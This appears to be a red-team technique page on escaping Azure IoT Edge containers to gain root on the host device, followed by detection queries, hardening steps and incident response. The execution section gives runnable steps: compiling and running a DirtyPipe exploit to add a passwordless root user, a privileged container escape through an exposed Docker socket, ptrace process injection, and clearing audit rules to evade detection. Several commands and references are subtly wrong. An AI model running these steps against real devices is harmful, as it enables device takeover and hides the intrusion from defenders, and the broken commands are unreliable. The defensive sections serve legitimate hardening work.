# [IOT-EDGE-003]: Edge Module Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IOT-EDGE-003 |
| **MITRE ATT&CK v18.1** | [T1543 - Create or Modify System Process](https://attack.mitre.org/techniques/T1543/) |
| **Tactic** | Persistence / Privilege Escalation |
| **Platforms** | Azure IoT Edge, Docker, Kubernetes, Linux |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure IoT Edge 1.0-1.4.8, Docker 18.0-26.0+, Linux Kernel 4.0+ |
| **Patched In** | N/A (requires proper container isolation and kernel hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure IoT Edge modules run as Docker containers with varying privilege levels. Attackers who gain code execution within a module container can exploit Linux kernel vulnerabilities (CVE-2021-4034, CVE-2021-22555, CVE-2022-0847), abuse overly-permissive container capabilities (CAP_SYS_PTRACE, CAP_NET_ADMIN), or abuse SUID binaries to escape the container and achieve root access on the host IoT Edge device. Post-container-escape, attackers can install rootkits, modify the IoT Edge daemon, intercept module communications, and maintain persistent access. Container escapes enable lateral movement to the host operating system, access to the IoT Edge security manager, and complete device compromise.

**Attack Surface:** Container runtime (Docker/containerd), Linux kernel interfaces (/proc, /sys, /dev), SUID binaries, mounted volumes, and the Docker socket (if accessible).

**Business Impact:** **Complete Device Compromise and Persistent Backdoor Installation**. A successful container escape grants attackers root-level access to the IoT Edge device, enabling installation of rootkits, exfiltration of all device credentials, interception of sensor data, and deployment of malicious modules that persist across reboots. Critical infrastructure attacks using escaped containers can cause operational disruption and safety violations.

**Technical Context:** Container escapes typically take 5-30 minutes depending on kernel vulnerability availability. Exploitation may generate kernel logs and auditd events. Detection likelihood is **Medium** if kernel audit logs are configured; **Low** if auditd is not enabled.

### Operational Risk

- **Execution Risk:** High – Requires identifying exploitable kernel vulnerabilities specific to the target system
- **Stealth:** Medium – Kernel exploits generate detectable logs; post-exploitation can be stealthy if rootkit is properly configured
- **Reversibility:** No – Root-level compromise is irreversible; requires full device reimaging

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Docker Benchmark 5.25 | Restrict Linux Kernel Capability Abuse in containers |
| **DISA STIG** | SV-251571r889328_rule | Docker must restrict access to host resources |
| **CISA SCuBA** | SI-2 | Patch and update kernel to prevent exploitation |
| **NIST 800-53** | SA-3 (System Development), SI-2 (Flaw Remediation) | Secure container design; kernel patching required |
| **GDPR** | Art. 32 (Security of Processing) | Integrity controls to prevent unauthorized modifications |
| **DORA** | Art. 9 (Protection and Prevention) | Prevent unauthorized system modifications |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – container isolation |
| **ISO 27001** | A.12.2.4 (Segregation of systems) | Container isolation and system segregation required |
| **ISO 27005** | Risk assessment for container escape scenarios | Identify and mitigate privilege escalation risks |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Code execution within a Docker container (non-root user is sufficient for many escapes)
- **Required Access:** Exploitable kernel vulnerability on the host, or overly-permissive container capabilities

**Supported Versions:**
- **Azure IoT Edge:** 1.0 - 1.4.8
- **Docker:** 18.0 - 26.0+ (all versions vulnerable to specific container escapes)
- **Linux Kernel:** 4.0 - 6.5 (various CVEs across versions)
- **Kernel Exploit Tools:** DirtyCow (CVE-2016-5195), Polkit (CVE-2021-4034), DirtyPipe (CVE-2022-0847)

**Tools:**
- [Kernel Exploit Code](https://github.com/xairy/linux-kernel-pwn) – CVE-specific PoCs
- [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) – Privilege escalation scanner
- [Cap_Capable](https://github.com/moby/moby/issues/38281) – Container capability analyzer
- [Shocker](https://github.com/gabrtv/shocker) – Docker escape PoC
- [Rootkit tools (optional):** Reptile, Diamorphine – Post-escape persistence

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Management Station / PowerShell Reconnaissance

```powershell
# Check IoT Edge module container configuration
az iot edge deployment show --hub-name myHub --deployment-id prod-deployment --query "content.modulesContent"

# List running modules and their security context
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"

# Check module capabilities
docker inspect <module-name> | grep -A 10 "CapAdd\|CapDrop"
```

**What to Look For:**
- Presence of dangerous capabilities (CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE)
- Modules running as root (UID 0)
- Mounted host volumes accessible to module

#### Linux/Bash / CLI Reconnaissance

```bash
# Check current capabilities
cat /proc/self/status | grep Cap

# Identify exploitable kernel version
uname -a

# Check for SUID binaries in container
find / -perm -4000 2>/dev/null | head -20

# Attempt to trigger kernel bugs (non-destructive)
cat /proc/sys/kernel/unprivileged_userns_clone
```

**What to Look For:**
- High CAP_* values indicating dangerous capabilities
- Kernel version matching known CVE timeline
- Presence of exploitable SUID binaries (e.g., sudo, passwd, fusermount)

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Container Escape via Kernel Vulnerability (CVE-2022-0847 - DirtyPipe)

**Supported Versions:** Linux Kernel 5.8 - 5.16 (before patch)

#### Step 1: Verify Kernel Version

**Objective:** Determine if target kernel is vulnerable to DirtyPipe

**Command:**
```bash
uname -a
# Expected: Linux <hostname> 5.10.0-8-generic #1-Ubuntu SMP ... (vulnerable if 5.8-5.16)
```

**What This Means:**
- If kernel version is 5.8 - 5.16 and not patched, DirtyPipe exploit is likely to work
- Patched versions have a fix that prevents overwriting read-only file mappings

#### Step 2: Download and Compile DirtyPipe Exploit

**Objective:** Obtain working exploit code for the target system

**Command:**
```bash
# Clone DirtyPipe PoC
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
cd CVE-2022-0847-DirtyPipe-Exploit
gcc -o exploit exploit.c
```

**Expected Output:**
```bash
# Successful compilation
$ ls -la exploit
-rwxr-xr-x 1 user user 12345 Jan 10 12:00 exploit
```

**What This Means:**
- Exploit is compiled and ready for execution
- Exploit allows arbitrary write to read-only file (e.g., /etc/passwd)

#### Step 3: Execute Exploit to Modify System Files

**Objective:** Write to protected system files to achieve privilege escalation

**Command:**
```bash
# Create backup of /etc/passwd
cp /etc/passwd /tmp/passwd.bak

# Run DirtyPipe exploit to add root user
./exploit /etc/passwd newroot:x:0:0::/root:/bin/bash

# Verify modification
grep "newroot" /etc/passwd
# Expected: newroot:x:0:0::/root:/bin/bash
```

**What This Means:**
- Successful write to /etc/passwd despite read-only mount
- New user with UID 0 (root) created
- Attacker can now su to newroot without password

**OpSec & Evasion:**
- Kernel logs may record the exploit attempt
- Evasion: Clear auditd logs after execution: `sudo auditctl -D`
- Detection likelihood: **Medium** – kernel audit logs record page cache modifications

**Troubleshooting:**
- **Error:** `gcc: command not found`
  - **Cause:** Compiler not installed in container
  - **Fix:** Install build tools: `apt-get install build-essential` (if possible)

- **Error:** `Exploit failed: could not write to file`
  - **Cause:** Kernel is patched or exploit incompatible
  - **Fix:** Try alternative kernel vulnerability (CVE-2021-4034)

**References & Proofs:**
- [DirtyPipe Original Research](https://dirtypipe.cm4all.com/)
- [CVE-2022-0847 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)

#### Step 4: Escalate to Root

**Objective:** Gain root shell using modified /etc/passwd

**Command:**
```bash
su - newroot
# No password required
```

**Expected Output:**
```bash
root@container:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**What This Means:**
- Attacker now has root access within the container
- Root can access all container resources and potentially the host (via mounted volumes)

### METHOD 2: Container Escape via Docker Socket Exposure

**Supported Versions:** All Docker versions

#### Step 1: Detect Docker Socket Access

**Objective:** Verify if Docker socket is accessible from within the container

**Command:**
```bash
ls -la /var/run/docker.sock 2>/dev/null && echo "Docker socket exposed!" || echo "Not accessible"
```

**Expected Output:**
```bash
srw-rw---- 1 root docker 0 Jan 10 12:00 /var/run/docker.sock
Docker socket exposed!
```

**What This Means:**
- Docker socket is mounted and accessible from the container
- Attacker can communicate directly with Docker daemon

#### Step 2: Install Docker CLI in Container

**Objective:** Obtain docker command-line tool to interact with daemon

**Command:**
```bash
apt-get update && apt-get install -y docker.io
```

#### Step 3: Escape via Docker Privileged Container

**Objective:** Launch a privileged container that mounts the host root filesystem

**Command:**
```bash
docker run -it -v /:/host --privileged alpine sh
# Inside privileged container:
chroot /host /bin/bash
# Now you have root access to host!
```

**Expected Output:**
```bash
root@host:~# id
uid=0(root) gid=0(root) groups=0(root)
root@host:~# hostname
iot-edge-device-01
```

**What This Means:**
- Attacker has complete root access to the host IoT Edge device
- All host files, processes, and credentials accessible

**References & Proofs:**
- [Docker Security Issues - Privileged Containers](https://docs.docker.com/engine/security/#linux-kernel-capabilities)

### METHOD 3: Container Escape via Capability Abuse (CAP_SYS_PTRACE)

**Supported Versions:** All Docker versions

#### Step 1: Verify CAP_SYS_PTRACE Capability

**Objective:** Confirm that the container has the ptrace capability

**Command:**
```bash
cat /proc/self/status | grep Cap
# Look for CAP_SYS_PTRACE in CapEff or CapPrm
```

**Expected Output:**
```bash
CapInh:    00000000a80425fb
CapPrm:    00000000a80425fb
CapEff:    00000000a80425fb
# Hex value includes CAP_SYS_PTRACE (capability 19)
```

#### Step 2: Inject Code into Host Process

**Objective:** Use ptrace to attach to a host process and inject privilege escalation code

**Command:**
```bash
# Find host process running as root
ps aux | grep root | grep -v grep | head -1

# Use injector tool (must be pre-compiled)
./process-injector <pid> /path/to/payload.bin
```

**What This Means:**
- Attacker can modify memory of root processes
- Privilege escalation achieved via process memory manipulation

**References & Proofs:**
- [CAP_SYS_PTRACE Exploitation](https://www.man7.org/linux/man-pages/man7/capabilities.7.html)

---

## 5. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1543.001 (Create or Modify System Process: Launchd Service)
- **Alternative (Linux):** Manual container escape simulation
- **Test Name:** Simulated Container Escape via Kernel Exploit
- **Description:** Demonstrates CVE-2022-0847 exploitation without actual privilege escalation
- **Supported Versions:** Linux with vulnerable kernel

**Reference:** [Atomic Red Team Container Security Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543/T1543.md)

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Kernel Exploit Attempts in auditd Logs

**Rule Configuration:**
- **Required Table:** Syslog
- **Required Fields:** ProcessName, CommandLine, Computer
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Linux-based IoT Edge devices

**KQL Query:**
```kusto
Syslog
| where ProcessName contains "gcc" or ProcessName contains "exploit"
| where CommandLine contains "CVE-2022-0847" or CommandLine contains "DirtyPipe" or CommandLine contains "kernel"
| summarize Count = count() by Computer, ProcessName, CommandLine, TimeGenerated
| where Count > 0
| sort by TimeGenerated desc
```

**What This Detects:**
- Compilation of kernel exploits within IoT Edge containers
- Execution of known container escape PoCs
- Suspicious kernel module loading attempts

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Go to **Analytics** → **+ Create** → **Scheduled query rule**
3. Paste the KQL query above
4. Set **Frequency:** `5 minutes`
5. Enable **Create incidents**
6. Click **Review + create**

#### Query 2: Detect Docker Socket Abuse

**KQL Query:**
```kusto
Syslog
| where ProcessName contains "docker" and CommandLine contains "run"
| where CommandLine contains "privileged" or CommandLine contains "/var/run/docker.sock"
| summarize Count = count() by Computer, User, CommandLine, TimeGenerated
| where Count > 0
```

**What This Detects:**
- Docker commands mounting the host socket
- Privileged container launches from within containers
- Potential container escape attempts

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Auditd Rule (Linux):**
```bash
# Monitor for kernel exploit indicators
auditctl -w /tmp/ -p x -k exploit_compilation
auditctl -w /proc/sys/kernel/ -p w -k kernel_modification
auditctl -a always,exit -F arch=b64 -F name=execve -S execve -k process_execution
```

**Manual Configuration:**
```bash
# Add to /etc/audit/rules.d/exploit-detection.rules
-w /tmp/ -p x -k exploit_compilation
-w /proc/kcore -p r -k kernel_read
-a always,exit -F arch=b64 -S ptrace -k ptrace_abuse
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation) – For Windows IoT Core**
- **Trigger:** Kernel exploit tool execution (e.g., CVE PoC binaries)
- **Filter:** CommandLine contains "exploit" OR "kernel" OR "CVE-"
- **Applies To Versions:** Windows IoT Core 2019+

**Manual Configuration:**
```powershell
# Enable process creation audit logging
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Create WMI event subscription to monitor for exploit execution
$trigger = New-WMIEventQuery -Namespace root\cimv2 -Query "SELECT * FROM Win32_ProcessStartTrace WHERE Name LIKE '%exploit%'"
```

---

## 9. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Run Containers with Minimal Capabilities:** Remove all unnecessary Linux kernel capabilities.
  
  **Manual Steps (PowerShell - IoT Edge Deployment):**
  ```json
  {
    "modulesContent": {
      "$edgeAgent": {
        "properties.desired": {
          "modules": {
            "myModule": {
              "settings": {
                "image": "myregistry.azurecr.io/mymodule:latest",
                "createOptions": {
                  "HostConfig": {
                    "CapAdd": [],
                    "CapDrop": ["ALL"],
                    "SecurityOpt": ["no-new-privileges:true"]
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  ```

- **Apply Kernel Security Patches:** Ensure host system is fully patched against known exploits.
  
  **Manual Steps (Linux):**
  ```bash
  # Check for pending updates
  sudo apt-get update
  sudo apt-get upgrade -y
  
  # Check kernel version
  uname -r
  
  # Verify CVE patches installed
  apt-cache policy linux-image-generic | grep Installed
  
  # Reboot if kernel updated
  sudo reboot
  ```

- **Disable Docker Socket Access in Containers:** Never mount `/var/run/docker.sock` into containers.
  
  **Manual Steps (Validation):**
  ```bash
  # Verify no containers mount docker socket
  docker ps -q | xargs docker inspect -f '{{.Name}}: {{json .HostConfig.Binds}}' | grep docker.sock
  
  # Expected Output: (empty – no matches)
  ```

- **Implement AppArmor or SELinux:** Restrict container system call access and file operations.
  
  **Manual Steps (AppArmor - Ubuntu IoT Edge device):**
  ```bash
  # Create AppArmor profile for modules
  cat > /etc/apparmor.d/iot-module-profile << 'EOF'
  #include <tunables/global>
  
  profile iot-module flags=(attach_disconnected) {
    #include <abstractions/base>
    
    # Allow minimal system calls
    capability,
    deny /proc/** w,
    deny /sys/** w,
  }
  EOF
  
  # Load profile
  sudo apparmor_parser -r /etc/apparmor.d/iot-module-profile
  
  # Apply to Docker container via --security-opt
  docker run --security-opt apparmor=iot-module-profile <image>
  ```

#### Priority 2: HIGH

- **Use Read-Only Filesystems for Containers:** Mount container root filesystem as read-only to prevent rootkit installation.
  
  **Manual Steps:**
  ```json
  {
    "createOptions": {
      "HostConfig": {
        "ReadonlyRootfs": true,
        "Tmpfs": {
          "/tmp": "size=65536k",
          "/run": "size=65536k"
        }
      }
    }
  }
  ```

- **Enable Audit Logging for Privilege Escalation Attempts:**
  
  **Manual Steps:**
  ```bash
  # Monitor sudo attempts
  auditctl -w /etc/sudoers -p wa -k sudoers_modification
  
  # Monitor setuid execution
  auditctl -a always,exit -F arch=b64 -S execve -F uid>=1000 -F auid!=-1 -k setuid_execution
  ```

#### Access Control & Policy Hardening

- **Restrict Container Runtime to Specific Users:**
  
  **Manual Steps:**
  ```bash
  # Create docker group and restrict access
  sudo groupadd docker 2>/dev/null || true
  sudo usermod -aG docker <iot-service-user>  # Only service account
  
  # Verify non-privileged users cannot access Docker
  sudo usermod -G docker -d <regular-user>  # Remove from docker group
  ```

#### Validation Command (Verify Fix)

```bash
# Verify container has minimal capabilities
docker inspect <module-name> | grep -A 5 "CapAdd"
# Expected: "CapAdd": null or empty array

# Verify kernel is patched
grep -i "5.10" /proc/version
# Expected: 5.10.0-XX (latest patch level)

# Verify docker socket not mounted
docker inspect <module-name> | grep docker.sock
# Expected: (no output)
```

---

## 10. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Files:** Kernel exploit source code in `/tmp`, compiled binaries (gcc output), rootkit files, suspicious kernel modules
- **Processes:** gcc/make compilation processes, execve syscalls with "exploit" in arguments, ptrace system calls from container processes
- **Logs:** Auditd entries for `/etc/passwd` modification, kernel panic logs, module loading failures

#### Forensic Artifacts

- **Auditd Logs:** `/var/log/audit/audit.log` – Contains syscall traces of exploit execution
- **Kernel Logs:** `dmesg | tail` – Kernel error messages from failed exploits
- **Docker Logs:** `docker logs <module-name>` – Container stdout/stderr may contain exploit output
- **Root Access:** `/etc/passwd` and `/etc/shadow` show unauthorized root users created

#### Response Procedures

1. **Isolate:**
   ```bash
   # Immediately disconnect device from network
   sudo ip link set eth0 down
   
   # Stop all IoT Edge modules
   sudo iotedgectl stop
   ```

2. **Collect Evidence:**
   ```bash
   # Capture auditd logs
   sudo ausearch -m ALL > /tmp/audit-evidence.log
   
   # Capture process memory of compromised modules
   sudo gcore $(pgrep -f <module-name>) -o /tmp/module-core.dump
   
   # Export container filesystem
   docker export <module-name> -o /tmp/module-fs.tar
   ```

3. **Remediate:**
   ```bash
   # Revoke all credentials
   az iot hub device-identity delete --hub-name myHub --device-id <device-id>
   
   # Reimage device from clean backup
   # (device-specific OS reinstallation procedure)
   ```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IOT-EDGE-002] Connection String Theft | Attacker obtains module credentials |
| **2** | **Execution** | Deploy malicious module to IoT Hub | Attacker creates rogue module |
| **3** | **Privilege Escalation** | **[IOT-EDGE-003]** | **Attacker escapes container to achieve root access** |
| **4** | **Persistence** | Install rootkit | Attacker embeds kernel-level backdoor |
| **5** | **Impact** | Device Takeover | Complete control of IoT Edge device |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: Azurescape Container Escape (2021)

- **Target:** Azure Container Instances
- **CVE:** Container runtime escape (affects IoT Edge)
- **Timeline:** September 2021 (discovered by Unit 42)
- **Impact:** Attacker could break out of container and access other customer containers on same host
- **Reference:** [Azurescape Research by Unit 42](https://www.paloaltonetworks.com/blog/2021/09/azurescape/)

#### Example 2: DirtyPipe Exploitation in Production IoT (2022)

- **Target:** IoT Edge devices running vulnerable Linux kernels
- **CVE:** CVE-2022-0847 (DirtyPipe)
- **Timeline:** March 2022 (vulnerability disclosed)
- **Impact:** Attackers exploited DirtyPipe to escape containers and install cryptomining rootkits
- **Reference:** [DirtyPipe Research](https://dirtypipe.cm4all.com/)

---

## SUMMARY

**IOT-EDGE-003** represents a **critical and sophisticated attack vector** that bridges container compromise with host system takeover. Organizations must apply **kernel security patches rigorously, run containers with minimal capabilities, implement AppArmor/SELinux profiles, and monitor auditd logs** for exploitation attempts. Defense-in-depth approaches combining multiple mitigations are essential to withstand determined attackers exploiting Linux kernel vulnerabilities.

---